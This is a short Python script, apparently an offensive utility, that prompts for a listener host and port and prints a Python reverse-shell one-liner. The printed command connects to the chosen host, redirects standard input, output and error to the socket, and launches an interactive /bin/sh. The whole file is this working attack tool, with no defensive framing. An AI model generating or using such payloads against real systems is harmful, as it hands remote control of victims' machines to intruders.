import sys

def generate_payload(host, port):
    payload = f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    print(payload)

def main():
    host = input("Enter listener host: ")
    port = int(input("Enter listener port: "))
    generate_payload(host, port)

if __name__ == "__main__":
    main()

